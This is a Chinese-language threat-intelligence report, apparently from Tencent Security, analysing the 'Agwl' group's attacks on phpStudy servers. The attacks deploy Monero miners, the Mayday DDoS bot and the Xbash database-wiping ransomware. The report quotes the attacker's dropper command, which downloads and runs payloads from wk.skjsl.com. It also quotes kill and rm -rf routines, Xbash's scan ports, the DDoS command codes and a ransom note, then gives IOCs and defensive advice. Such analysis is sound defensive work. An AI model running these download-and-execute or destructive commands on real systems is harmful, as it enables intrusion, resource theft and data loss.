**作者：腾讯安全御见威胁情报中心**  
**来源：<https://mp.weixin.qq.com/s/wCjKwENZajw1vA9dmdgftQ>**

腾讯安全御见威胁情报中心监测到“Agwl”团伙在近期的入侵行动将Linux系统纳入攻击范围。

## 一、背景

腾讯安全御见威胁情报中心监测到“Agwl”团伙在近期的入侵行动将Linux系统纳入攻击范围。“Agwl”团伙于2018年7月被御见威胁情报中心发现，其攻击特点为探测phpStudy搭建的网站，并针对其网站搭建时使用的默认的MySQL弱口令进行爆破登录，从而植入挖矿以及远控木马。

该团伙早期入侵后植入的都是基于Windows平台的木马，其挖矿木马部分会首选清除其他挖矿程序、阻止其他挖矿木马访问矿池、独享系统资源。而最近的更新中，我们监测发现，“Agwl”团伙增加了对Linux系统的攻击，入侵成功后加入基于Linux系统执行的bash脚本代码s667。该脚本运行后会添加自身到定时任务，并进一步下载Linux平台下的CPU挖矿木马bashf和GPU挖矿木马bashg。

然而此时攻击并没有结束，“Agwl”团伙会继续植入Linux平台的DDoS病毒lst（有国外研究者命名为“Mayday”）以及勒索蠕虫病毒Xbash。Xbash勒索病毒会从C2服务器读取攻击IP地址段，扫描这些网络中的VNC、Rsync、MySQL、MariaDB、Memcached、PostgreSQL、MongoDB和phpMyAdmin服务器进行爆破攻击，爆破登录成功后不像其他勒索病毒那样去加密数据再勒索酬金，而是直接将数据库文件删除后骗取酬金，企业一旦中招将会遭受严重损失。

![img](https://images.seebug.org/content/images/2019/08/07/1565160371000-622b0e007fa4e36ecaabaadcb1a3bfae.png-w331s)

“Agwl”团伙攻击流程

## 二、详细分析

中招主机通过phpStudy一键部署PHP环境，默认情况下包含phpinfo及phpMyAdmin并且任何人都可以访问，同时安装的MySQL默认口令为弱口令密码并且开启在外网3306端口。在未设置安全组或者安全组为放通全端口的情况下，受到攻击者对于phpStudy的针对性探测，并且暴露了其MySQL弱口令。攻击者使用MySQL弱口令登录后,在web目录下执行Shell，并在其中添加植入挖矿木马的恶意代码。

入侵后执行shell命令为：

cmd.exe /c "certutil.exe -urlcache -split -f http://wk.skjsl.com:93/Down.exe
&Down.exe &del Down.exe&cd /tmp &&wget http://wk.skjsl.com:93/s667 &chmod 777
s667&./s667

“Agwl”团伙对Windows平台植入的木马为Down.exe，针对Linux平台植入的是s667。

## Down.exe

Down.exe为自解压程序，解压后释放一个hosts文件和7个BAT文件。根据解压命令，文件被释放到C:\Windows\debug\SYSTEM
目录下，首先被执行的是start.bat

![img](https://images.seebug.org/content/images/2019/08/07/1565160373000-b1e34585356676b35a80213b51271d44.png-w331s)

Start.bat主要功能为：

创建目录C:\ProgramData\Microsoft\test并设置为隐藏，将down.bat、open.bat、skycmd.bat拷贝到该目录中并安装为计划任务反复执行，对应的计划任务名分别为“SYSTEM”、“DNS”、“skycmd”；然后从www[.]kuaishounew.com下载wget.exe作为后续下载工具；最后启动start2.bat。

![img](https://images.seebug.org/content/images/2019/08/07/1565160374000-a018f84f8da54eb60459d515b2159c9c.png-w331s)

Start2.bat的功能为：

利用start.bat中下载的wget.exe从微软官方下载vc_redist.x64.exe，从www[.]kuaishounew.com下载unzip.exe(后续用到的解压工具)和hook.exe，然后执行install3.bat。

（vcredist_x64.exe是微软的Visual C运行时库,安装后能够在未安装VC的电脑上运行由 Visual
C++开发的64位应用，该模块被下载以保证64位木马正常运行。）

![img](https://images.seebug.org/content/images/2019/08/07/1565160374000-375a0276f4699469544f5673637a76ea.png-w331s)

Install3.bat主要用于木马的三个服务“SYSTEM”、“DNS”、“skycmd”的安装和保持。

1、服务“SYSTEM”

执行的脚本为down.bat，主要功能为下载矿机程序wrsngm.zip进行挖矿，该矿机程序为开源挖矿程序xmr-stak修改而成，github地址https[:]//github.com/fireice-uk/xmr-stak。

使用矿池：wk.skjsl.com:3333

钱包：4AggMSAnFrQbp2c6gb98BZDBydgmjNhhxdN4qBSjwc3BDNQZwg5hRqoNczXMr7Fz6ufbwVaJL8sJmTdrp2dbKYcFRY2pe33

![img](https://images.seebug.org/content/images/2019/08/07/1565160374000-d77ac8bcc3e4600f2af2f12884580390.png-w331s)

![img](https://images.seebug.org/content/images/2019/08/07/1565160375000-26bd111566097146f7cef23b575c7106.jpg-w331s)

该钱包上线时间不长，查询收益目前仅获得0.7个XMR

![img](https://images.seebug.org/content/images/2019/08/07/1565160375000-35f866fb6747a7542da762ddf049ff01.png-w331s)

2、服务“DNS”

对应执行的脚本为open.bat。功能为替换本地域名解析文件hosts，然后启动挖矿程序。

替换后的hosts文件将其他的矿池域名解析指向127.0.0.1，阻止其正常访问从而独占挖矿所需的计算资源。从该文件中还会将木马原来的C2地址从111.230.195.174迁移至116.206.177.144。

![img](https://images.seebug.org/content/images/2019/08/07/1565160375000-fc66706e13eb828af23c14a6279427ed.png-w331s)

open.bat还会启动qc.bat来清除入侵过程中在xampp、www、phpstudy目录下载残留的EXE木马，以及badboy.php、test00.php木马。

![img](https://images.seebug.org/content/images/2019/08/07/1565160375000-2329329486152d394dee211c37b1ff32.png-w331s)

3、服务“skycmd”

执行脚本skycmd.bat。功能为下载skycmdst.txt，重命名为skycmdst.bat并执行，目前下载该文件为网页文件，但黑客可通过后台配置动态更改下载的恶意代码。

![img](https://images.seebug.org/content/images/2019/08/07/1565160376000-4db29478e7bb883455b4fef3ee3c827b.png-w331s)

## s667

s667为入侵Linux系统后首先执行的脚本。脚本判断当前是否是root权限，如果不是则下载lower23.sh到/tmp/目录并通过nohup
bash命令执行；如果是root权限则添加下载执行s667的定时任务，每5分钟执行一次，然后下载rootv23.sh到/tmp/目录并通过nohup
bash命令执行。

![img](https://images.seebug.org/content/images/2019/08/07/1565160376000-daea0088aa05a0d0d71e29c5600270e0.png-w331s)

最终下载执行的bash脚本lower23.sh或root23.sh负责植入Linux版本挖矿木马、清理竞品挖矿木马以及植入其他病毒等功能。

在function kills()中对竞品挖矿木马进行清除：

1、按照进程名匹配（包括被安全厂商多次披露的利用redis入侵挖矿的木马“ddg*”、“sourplum”、”wnTKYg”）。

pkill -f sourplum

pkill wnTKYg && pkill ddg _ && rm -rf /tmp/ddg_ && rm -rf /tmp/wnTKYg

pkill -f biosetjenkins

pkill -f Loopback

pkill -f apaceha

pkill -f cryptonight

pkill -f stratum

pkill -f mixnerdx

pkill -f performedl

pkill -f JnKihGjn

pkill -f irqba2anc1

pkill -f irqba5xnc1

pkill -f irqbnc1

pkill -f ir29xc1

pkill -f conns

pkill -f irqbalance

pkill -f crypto-pool

pkill -f minexmr

pkill -f XJnRj

pkill -f NXLAi

2、按照矿池匹配，杀死连接指定矿池的进程

ps auxf|grep -v grep|grep "mine.moneropool.com"|awk '{print $2}'|xargs kill -9

ps auxf|grep -v grep|grep "xmr.crypto-pool.fr:8080"|awk '{print $2}'|xargs
kill -9

ps auxf|grep -v grep|grep "xmr.crypto-pool.fr:3333"|awk '{print $2}'|xargs
kill -9

ps auxf|grep -v grep|grep "monerohash.com"|awk '{print $2}'|xargs kill -9

ps auxf|grep -v grep|grep "/tmp/a7b104c270"|awk '{print $2}'|xargs kill -9

ps auxf|grep -v grep|grep "xmr.crypto-pool.fr:6666"|awk '{print $2}'|xargs
kill -9

ps auxf|grep -v grep|grep "xmr.crypto-pool.fr:7777"|awk '{print $2}'|xargs
kill -9

ps auxf|grep -v grep|grep "xmr.crypto-pool.fr:443"|awk '{print $2}'|xargs kill
-9

ps auxf|grep -v grep|grep "stratum.f2pool.com:8888"|awk '{print $2}'|xargs
kill -9

ps auxf|grep -v grep|grep "xmrpool.eu" | awk '{print $2}'|xargs kill -9

3、按照端口匹配，杀死使用端口9999/5555/7777/14444进行tcp通信的进程

PORT_NUMBER=9999

lsof -i tcp:2}' | xargs kill -9

PORT_NUMBER=5555

lsof -i tcp:2}' | xargs kill -9

PORT_NUMBER=7777

lsof -i tcp:2}' | xargs kill -9

PORT_NUMBER=14444

lsof -i tcp:2}' | xargs kill -9

4、删除指定目录文件

rm -rf /boot/grub/deamon && rm -rf /boot/grub/disk_genius

rm -rf /tmp/ _index_bak_

rm -rf /tmp/ _httpd.conf_

rm -rf /tmp/*httpd.conf

rm -rf /tmp/a7b104c270

rm -rf /tmp/httpd.conf

rm -rf /tmp/conn

rm -rf /tmp/conns

rm -f /tmp/irq.sh

rm -f /tmp/irqbalanc1

rm -f /tmp/irq

在function downloadyam()中下载Linux挖矿程序bashg(由开源GPU挖矿程序xmr-stak编译)和配置文件pools.txt；下载Linux平台CPU挖矿程序bashf(采用开源挖矿程序XMRig编译)以及配置文件名config.json。两种挖矿程序均使用与攻击Windows平台时相同的门罗币矿池和钱包。

![img](https://images.seebug.org/content/images/2019/08/07/1565160376000-a570c366e5bc6b80d1c8329cc428adba.png-w331s)

![img](https://images.seebug.org/content/images/2019/08/07/1565160376000-b0a98d558a778d2f8940b03e2238c0fb.png-w331s)

## DDoS病毒

lower23.sh在完成挖矿功能后，还会植入基于Linux的DDoS病毒lst(国外厂商命名为Mayday)

![img](https://images.seebug.org/content/images/2019/08/07/1565160377000-bb6067c78728bc72091ef6cd1e005842.png-w331s)

lst搜集以下信息，并将其保存至结构g_statBase中：

系统版本

CPU核心数及其时钟速率

CPU负载

网络负载

![img](https://images.seebug.org/content/images/2019/08/07/1565160377000-af4f4afb3ee42e7a1d1ec1a32db761e9.png-w331s)

创建一个新线程CThreadTaskManager ::
ProcessMain（），将开始攻击和终止攻击的命令放入执行队列。在此之后，创建一个新线程CThreadHostStatus ::
ProcessMain（），在此线程中，CPU和网络负载的数据每秒更新一次，如果接到请求，可以随时将数据发送到C＆C服务器。

然后创建20个线程，从任务队列中读取信息，并根据读取的信息启动攻击或终止攻击。

![img](https://images.seebug.org/content/images/2019/08/07/1565160378000-579a47f01d99352bc233e8519a8dd36a.png-w331s)

建立与C＆C的连接后，进入处理来自C＆C的消息的无限循环。如果命令具有参数，则C＆C则会发送另外4个字节，病毒根据接收到的不同参数执行不同类型的DDoS攻击。

![img](https://images.seebug.org/content/images/2019/08/07/1565160378000-1f4b51978c5c7a211f613d0516771d2e.png-w331s)

执行DDoS攻击命令协议如下：

0×01 发起攻击，参数定义攻击的类型和要使用的线程数。攻击类型由一个字节定义，该字节可以取值0x80到0x84，共有5种攻击类型：

0x80 - TCP洪水攻击。

0x81 - UDP洪水攻击。

0x82 - ICMP洪水攻击。

0x83,0x84 - 两次DNS洪水攻击。两种攻击都类似于0x81，除了端口53（DNS服务的默认端口）用作目标端口。

0x02 终止攻击。

0x03 更新配置文件。

0x04 用于将当前命令的执行状态发送到C＆C服务器。

## 勒索蠕虫

lower23.sh继续植入在基于Linux平台执行的勒索蠕虫病毒Xbash

![img](https://images.seebug.org/content/images/2019/08/07/1565160378000-02211a4403a9b0efe48a714f590af4ee.png-w331s)

Xbash为使用PyInstaller将Python代码打包生成的ELF格式可执行程序，用于感染Linux系统。使用工具pyi-archive_viewer可提取出其中的pyc文件，然后通过反编译程序将其还原成Python代码。

Xbash会通过弱口令爆破和已知的服务器组件漏洞进行攻击，而且会删除目标系统中的数据库，在删除数据后提示勒索比特币，然而并没有发现其具有恢复数据的功能。

扫描端口：

HTTP：80,8080,8888,8000,8001,8088

VNC：5900,5901,5902,5903

MySQL：3306

Memcached：11211

MySQL/MariaDB：3309,3308,3360 3306,3307,9806,1433

FTP：21

Telnet：23,2233

PostgreSQL：5432

Redis：6379,2379

ElasticSearch：9200

MongoDB：27017

RDP：3389

UPnP/SSDP：1900

NTP：123

DNS：53

SNMP：161

LDAP：389

Rexec：512

Rlogin：513

Rsh：514

Rsync：873

Oracle数据库：1521

CouchDB：5984

![img](https://images.seebug.org/content/images/2019/08/07/1565160378000-9323e8000ed10a45f759adc50a5680a2.png-w331s)

对于某些服务，如VNC，Rsync，MySQL，MariaDB，Memcached，PostgreSQL，MongoDB和phpMyAdmin，如果相关端口打开，则使用内置的弱用户名/密码字典进行爆破登录

![img](https://images.seebug.org/content/images/2019/08/07/1565160379000-1df98e89a639ba563f164e01d7b73ca8.png-w331s)

爆破登录成功后对用户的数据库进行删除：

![img](https://images.seebug.org/content/images/2019/08/07/1565160379000-fabdeddc056a328da54ad828f591c47f.png-w331s)

然后在数据库中创建勒索提示文本PLEASE_README_XYZ，勒索金额为0.02个比特币：

Send 0.02 BTC to this address and contact this email with your website or your
ip or db_name of your server to recover your database! Your DB is Backed up to
our servers!If we not recived your payment,we will leak your database',
LygJdH8fN7BCk2cwwNBRWqMZqL1','backupsql@pm.me

![img](https://images.seebug.org/content/images/2019/08/07/1565160379000-fe1221c65f8e93a8a74abb7acce120d0.png-w331s)

## 三、安全建议

  1. 加固服务器，修补服务器安全漏洞，对于phpStudy一类的集成环境，在安装结束后应及时修改MySQL密码为强密码，避免被黑客探测入侵。 

  2. 服务备份重要数据，并进行内网外网隔离防止重要数据丢失。检查并去除VNC、Rsync、MySQL、MariaDB、Memcached、PostgreSQL、MongoDB和phpMyAdmin等服务器使用的弱口令。 

  3. 网站管理员可使用腾讯云网站管家智能防护平台（网址：<https://s.tencent.com/product/wzgj/index.html>），该系统具备Web入侵防护，0Day漏洞补丁修复等多纬度防御策略，可全面保护网站系统安全。 

  4. 使用腾讯御界高级威胁检测系统检测未知黑客的各种可疑攻击行为。御界高级威胁检测系统，是基于腾讯反病毒实验室的安全能力、依托腾讯在云和端的海量数据，研发出的独特威胁情报和恶意检测模型系统。 

![img](https://images.seebug.org/content/images/2019/08/07/1565160380000-a06835bffaa8a556a922f0e3f5a40e34.png-w331s)

## IOCs

IP

116.206.177.144

Domain

down.ctosus.ru

wk.skjsl.com

fk3.f3322.org

sbkcbig.f3322.net

URL

http[:]//down.ctosus.ru/bat.exe

http[:]//wk.skjsl.com:93/s667

http[:]//wk.skjsl.com:93/lowerv23.sh

http[:]//wk.skjsl.com:93/rootv23.sh

http[:]//wk.skjsl.com:93/xlk

http[:]//wk.skjsl.com/wrsngm.zip

http[:]//wk.skjsl.com/downulr.txt

http[:]//wk.skjsl.com/config.sjon

http[:]//wk.skjsl.com/bashf

http[:]//wk.skjsl.com/bashg

http[:]//wk.skjsl.com/pools.txt

http[:]//wk.skjsl.com/lst

http[:]//wk.skjsl.com/XbashH

http[:]//wk.skjsl.com/NetSyst96.dll

http[:]//www.kuaishounew.com/Down.exe

http[:]//www.kuaishounew.com/apps.txt

http[:]//www.kuaishounew.com/hook.exe

http[:]//www.kuaishounew.com/hehe.exe

http[:]//www.kuaishounew.com/office.exe

http[:]//www.kuaishounew.com/hehe.exe

http[:]//www.kuaishounew.com/hosts

http[:]//116.206.177.144/wrsngm.zip

http[:]//fk3.f3322.org/skycmdst.txt

md5

51d49c455bd66c9447ad52ebdb7c526a

fb9922e88f71a8265e23082b8ff3d417

cacde9b9815ad834fc4fb806594eb830

17f00668f51592c215266fdbce2e4246

40834e200ef27cc87f7b996fe5d44898

3897bdb933047f7e1fcba060b7e49b40

39ea5004a6e24b9b52349f5e56e8c742

8fdfe319255e1d939fe5f4502e55deee

13f337029bae8b4167d544961befa360

1b93e030d2d6f1cef92b2b6323ff9e9e

589ba3aac5119fc4e2682bafb699727b

82d28855a99013c70348e217c162ceb9

门罗币钱包1：

4Ak2AQiC1R4hFmvfSYRXfX6JSjR6YN9E81SRvLXRzeCefRWhSXq3SKDf8ZEFmpobNkXmgXnqA3CGKgaiAEJ2pjYi8BeQcn7

门罗币钱包2:

4AggMSAnFrQbp2c6gb98BZDBydgmjNhhxdN4qBSjwc3BDNQZwg5hRqoNczXMr7Fz6ufbwVaJL8sJmTdrp2dbKYcFRY2pe33

比特币钱包：

1jqpmcLygJdH8fN7BCk2cwwNBRWqMZqL1

邮箱：

backupsql@pm.me

## 参考链接

<https://www.freebuf.com/column/195035.html>

[https://www.freebuf.com/column/178753.html](https://www.freebuf.com/column/195035.html
"https://www.freebuf.com/column/178753.html")

<https://securelist.com/versatile-ddos-trojan-for-linux/64361/>

<https://unit42.paloaltonetworks.com/unit42-xbash-combines-botnet-ransomware-coinmining-worm-targets-linux-windows/>

* * *

![Paper](https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg)
本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<https://paper.seebug.org/1005/>

